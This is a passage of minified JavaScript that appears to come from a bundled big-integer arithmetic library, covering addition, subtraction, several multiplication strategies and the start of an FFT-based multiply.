                    L = (U.words[se] | 0) + (Z.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                for (; te !== 0 && se < U.length; se++)
                    L = (U.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                if (this.length = U.length,
                te !== 0)
                    this.words[this.length] = te,
                    this.length++;
                else if (U !== this)
                    for (; se < U.length; se++)
                        this.words[se] = U.words[se];
                return this
            }
            ,
            w.prototype.add = function(q) {
                var L;
                return q.negative !== 0 && this.negative === 0 ? (q.negative = 0,
                L = this.sub(q),
                q.negative ^= 1,
                L) : q.negative === 0 && this.negative !== 0 ? (this.negative = 0,
                L = q.sub(this),
                this.negative = 1,
                L) : this.length > q.length ? this.clone().iadd(q) : q.clone().iadd(this)
            }
            ,
            w.prototype.isub = function(q) {
                if (q.negative !== 0) {
                    q.negative = 0;
                    var L = this.iadd(q);
                    return q.negative = 1,
                    L._normSign()
                } else if (this.negative !== 0)
                    return this.negative = 0,
                    this.iadd(q),
                    this.negative = 1,
                    this._normSign();
                var U = this.cmp(q);
                if (U === 0)
                    return this.negative = 0,
                    this.length = 1,
                    this.words[0] = 0,
                    this;
                var Z, te;
                U > 0 ? (Z = this,
                te = q) : (Z = q,
                te = this);
                for (var se = 0, de = 0; de < te.length; de++)
                    L = (Z.words[de] | 0) - (te.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                for (; se !== 0 && de < Z.length; de++)
                    L = (Z.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                if (se === 0 && de < Z.length && Z !== this)
                    for (; de < Z.length; de++)
                        this.words[de] = Z.words[de];
                return this.length = Math.max(this.length, de),
                Z !== this && (this.negative = 1),
                this.strip()
            }
            ,
            w.prototype.sub = function(q) {
                return this.clone().isub(q)
            }
            ;
            function ae(ce, q, L) {
                L.negative = q.negative ^ ce.negative;
                var U = ce.length + q.length | 0;
                L.length = U,
                U = U - 1 | 0;
                var Z = ce.words[0] | 0
                  , te = q.words[0] | 0
                  , se = Z * te
                  , de = se & 67108863
                  , re = se / 67108864 | 0;
                L.words[0] = de;
                for (var $ = 1; $ < U; $++) {
                    for (var ie = re >>> 26, ve = re & 67108863, ge = Math.min($, q.length - 1), Re = Math.max(0, $ - ce.length + 1); Re <= ge; Re++) {
                        var Pe = $ - Re | 0;
                        Z = ce.words[Pe] | 0,
                        te = q.words[Re] | 0,
                        se = Z * te + ve,
                        ie += se / 67108864 | 0,
                        ve = se & 67108863
                    }
                    L.words[$] = ve | 0,
                    re = ie | 0
                }
                return re !== 0 ? L.words[$] = re | 0 : L.length--,
                L.strip()
            }
            var ne = function(q, L, U) {
                var Z = q.words, te = L.words, se = U.words, de = 0, re, $, ie, ve = Z[0] | 0, ge = ve & 8191, Re = ve >>> 13, Pe = Z[1] | 0, Ie = Pe & 8191, Te = Pe >>> 13, Le = Z[2] | 0, Ze = Le & 8191, $e = Le >>> 13, Ne = Z[3] | 0, qe = Ne & 8191, Ve = Ne >>> 13, lt = Z[4] | 0, nt = lt & 8191, je = lt >>> 13, Ke = Z[5] | 0, Qe = Ke & 8191, We = Ke >>> 13, mt = Z[6] | 0, ct = mt & 8191, vt = mt >>> 13, we = Z[7] | 0, _e = we & 8191, Ce = we >>> 13, st = Z[8] | 0, et = st & 8191, tt = st >>> 13, He = Z[9] | 0, ke = He & 8191, Me = He >>> 13, Ue = te[0] | 0, rt = Ue & 8191, dt = Ue >>> 13, Et = te[1] | 0, ft = Et & 8191, gt = Et >>> 13, Yt = te[2] | 0, Ct = Yt & 8191, Ot = Yt >>> 13, Vt = te[3] | 0, Pt = Vt & 8191, Bt = Vt >>> 13, xr = te[4] | 0, Dt = xr & 8191, Ft = xr >>> 13, Mr = te[5] | 0, at = Mr & 8191, ze = Mr >>> 13, Je = te[6] | 0, ht = Je & 8191, _t = Je >>> 13, Ge = te[7] | 0, Ye = Ge & 8191, it = Ge >>> 13, Fe = te[8] | 0, ut = Fe & 8191, wt = Fe >>> 13, At = te[9] | 0, St = At & 8191, Tt = At >>> 13;
                U.negative = q.negative ^ L.negative,
                U.length = 19,
                re = Math.imul(ge, rt),
                $ = Math.imul(ge, dt),
                $ = $ + Math.imul(Re, rt) | 0,
                ie = Math.imul(Re, dt);
                var er = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (er >>> 26) | 0,
                er &= 67108863,
                re = Math.imul(Ie, rt),
                $ = Math.imul(Ie, dt),
                $ = $ + Math.imul(Te, rt) | 0,
                ie = Math.imul(Te, dt),
                re = re + Math.imul(ge, ft) | 0,
                $ = $ + Math.imul(ge, gt) | 0,
                $ = $ + Math.imul(Re, ft) | 0,
                ie = ie + Math.imul(Re, gt) | 0;
                var Xt = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Xt >>> 26) | 0,
                Xt &= 67108863,
                re = Math.imul(Ze, rt),
                $ = Math.imul(Ze, dt),
                $ = $ + Math.imul($e, rt) | 0,
                ie = Math.imul($e, dt),
                re = re + Math.imul(Ie, ft) | 0,
                $ = $ + Math.imul(Ie, gt) | 0,
                $ = $ + Math.imul(Te, ft) | 0,
                ie = ie + Math.imul(Te, gt) | 0,
                re = re + Math.imul(ge, Ct) | 0,
                $ = $ + Math.imul(ge, Ot) | 0,
                $ = $ + Math.imul(Re, Ct) | 0,
                ie = ie + Math.imul(Re, Ot) | 0;
                var pr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (pr >>> 26) | 0,
                pr &= 67108863,
                re = Math.imul(qe, rt),
                $ = Math.imul(qe, dt),
                $ = $ + Math.imul(Ve, rt) | 0,
                ie = Math.imul(Ve, dt),
                re = re + Math.imul(Ze, ft) | 0,
                $ = $ + Math.imul(Ze, gt) | 0,
                $ = $ + Math.imul($e, ft) | 0,
                ie = ie + Math.imul($e, gt) | 0,
                re = re + Math.imul(Ie, Ct) | 0,
                $ = $ + Math.imul(Ie, Ot) | 0,
                $ = $ + Math.imul(Te, Ct) | 0,
                ie = ie + Math.imul(Te, Ot) | 0,
                re = re + Math.imul(ge, Pt) | 0,
                $ = $ + Math.imul(ge, Bt) | 0,
                $ = $ + Math.imul(Re, Pt) | 0,
                ie = ie + Math.imul(Re, Bt) | 0;
                var or = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (or >>> 26) | 0,
                or &= 67108863,
                re = Math.imul(nt, rt),
                $ = Math.imul(nt, dt),
                $ = $ + Math.imul(je, rt) | 0,
                ie = Math.imul(je, dt),
                re = re + Math.imul(qe, ft) | 0,
                $ = $ + Math.imul(qe, gt) | 0,
                $ = $ + Math.imul(Ve, ft) | 0,
                ie = ie + Math.imul(Ve, gt) | 0,
                re = re + Math.imul(Ze, Ct) | 0,
                $ = $ + Math.imul(Ze, Ot) | 0,
                $ = $ + Math.imul($e, Ct) | 0,
                ie = ie + Math.imul($e, Ot) | 0,
                re = re + Math.imul(Ie, Pt) | 0,
                $ = $ + Math.imul(Ie, Bt) | 0,
                $ = $ + Math.imul(Te, Pt) | 0,
                ie = ie + Math.imul(Te, Bt) | 0,
                re = re + Math.imul(ge, Dt) | 0,
                $ = $ + Math.imul(ge, Ft) | 0,
                $ = $ + Math.imul(Re, Dt) | 0,
                ie = ie + Math.imul(Re, Ft) | 0;
                var yr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (yr >>> 26) | 0,
                yr &= 67108863,
                re = Math.imul(Qe, rt),
                $ = Math.imul(Qe, dt),
                $ = $ + Math.imul(We, rt) | 0,
                ie = Math.imul(We, dt),
                re = re + Math.imul(nt, ft) | 0,
                $ = $ + Math.imul(nt, gt) | 0,
                $ = $ + Math.imul(je, ft) | 0,
                ie = ie + Math.imul(je, gt) | 0,
                re = re + Math.imul(qe, Ct) | 0,
                $ = $ + Math.imul(qe, Ot) | 0,
                $ = $ + Math.imul(Ve, Ct) | 0,
                ie = ie + Math.imul(Ve, Ot) | 0,
                re = re + Math.imul(Ze, Pt) | 0,
                $ = $ + Math.imul(Ze, Bt) | 0,
                $ = $ + Math.imul($e, Pt) | 0,
                ie = ie + Math.imul($e, Bt) | 0,
                re = re + Math.imul(Ie, Dt) | 0,
                $ = $ + Math.imul(Ie, Ft) | 0,
                $ = $ + Math.imul(Te, Dt) | 0,
                ie = ie + Math.imul(Te, Ft) | 0,
                re = re + Math.imul(ge, at) | 0,
                $ = $ + Math.imul(ge, ze) | 0,
                $ = $ + Math.imul(Re, at) | 0,
                ie = ie + Math.imul(Re, ze) | 0;
                var vr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (vr >>> 26) | 0,
                vr &= 67108863,
                re = Math.imul(ct, rt),
                $ = Math.imul(ct, dt),
                $ = $ + Math.imul(vt, rt) | 0,
                ie = Math.imul(vt, dt),
                re = re + Math.imul(Qe, ft) | 0,
                $ = $ + Math.imul(Qe, gt) | 0,
                $ = $ + Math.imul(We, ft) | 0,
                ie = ie + Math.imul(We, gt) | 0,
                re = re + Math.imul(nt, Ct) | 0,
                $ = $ + Math.imul(nt, Ot) | 0,
                $ = $ + Math.imul(je, Ct) | 0,
                ie = ie + Math.imul(je, Ot) | 0,
                re = re + Math.imul(qe, Pt) | 0,
                $ = $ + Math.imul(qe, Bt) | 0,
                $ = $ + Math.imul(Ve, Pt) | 0,
                ie = ie + Math.imul(Ve, Bt) | 0,
                re = re + Math.imul(Ze, Dt) | 0,
                $ = $ + Math.imul(Ze, Ft) | 0,
                $ = $ + Math.imul($e, Dt) | 0,
                ie = ie + Math.imul($e, Ft) | 0,
                re = re + Math.imul(Ie, at) | 0,
                $ = $ + Math.imul(Ie, ze) | 0,
                $ = $ + Math.imul(Te, at) | 0,
                ie = ie + Math.imul(Te, ze) | 0,
                re = re + Math.imul(ge, ht) | 0,
                $ = $ + Math.imul(ge, _t) | 0,
                $ = $ + Math.imul(Re, ht) | 0,
                ie = ie + Math.imul(Re, _t) | 0;
                var gr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (gr >>> 26) | 0,
                gr &= 67108863,
                re = Math.imul(_e, rt),
                $ = Math.imul(_e, dt),
                $ = $ + Math.imul(Ce, rt) | 0,
                ie = Math.imul(Ce, dt),
                re = re + Math.imul(ct, ft) | 0,
                $ = $ + Math.imul(ct, gt) | 0,
                $ = $ + Math.imul(vt, ft) | 0,
                ie = ie + Math.imul(vt, gt) | 0,
                re = re + Math.imul(Qe, Ct) | 0,
                $ = $ + Math.imul(Qe, Ot) | 0,
                $ = $ + Math.imul(We, Ct) | 0,
                ie = ie + Math.imul(We, Ot) | 0,
                re = re + Math.imul(nt, Pt) | 0,
                $ = $ + Math.imul(nt, Bt) | 0,
                $ = $ + Math.imul(je, Pt) | 0,
                ie = ie + Math.imul(je, Bt) | 0,
                re = re + Math.imul(qe, Dt) | 0,
                $ = $ + Math.imul(qe, Ft) | 0,
                $ = $ + Math.imul(Ve, Dt) | 0,
                ie = ie + Math.imul(Ve, Ft) | 0,
                re = re + Math.imul(Ze, at) | 0,
                $ = $ + Math.imul(Ze, ze) | 0,
                $ = $ + Math.imul($e, at) | 0,
                ie = ie + Math.imul($e, ze) | 0,
                re = re + Math.imul(Ie, ht) | 0,
                $ = $ + Math.imul(Ie, _t) | 0,
                $ = $ + Math.imul(Te, ht) | 0,
                ie = ie + Math.imul(Te, _t) | 0,
                re = re + Math.imul(ge, Ye) | 0,
                $ = $ + Math.imul(ge, it) | 0,
                $ = $ + Math.imul(Re, Ye) | 0,
                ie = ie + Math.imul(Re, it) | 0;
                var Sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Sr >>> 26) | 0,
                Sr &= 67108863,
                re = Math.imul(et, rt),
                $ = Math.imul(et, dt),
                $ = $ + Math.imul(tt, rt) | 0,
                ie = Math.imul(tt, dt),
                re = re + Math.imul(_e, ft) | 0,
                $ = $ + Math.imul(_e, gt) | 0,
                $ = $ + Math.imul(Ce, ft) | 0,
                ie = ie + Math.imul(Ce, gt) | 0,
                re = re + Math.imul(ct, Ct) | 0,
                $ = $ + Math.imul(ct, Ot) | 0,
                $ = $ + Math.imul(vt, Ct) | 0,
                ie = ie + Math.imul(vt, Ot) | 0,
                re = re + Math.imul(Qe, Pt) | 0,
                $ = $ + Math.imul(Qe, Bt) | 0,
                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
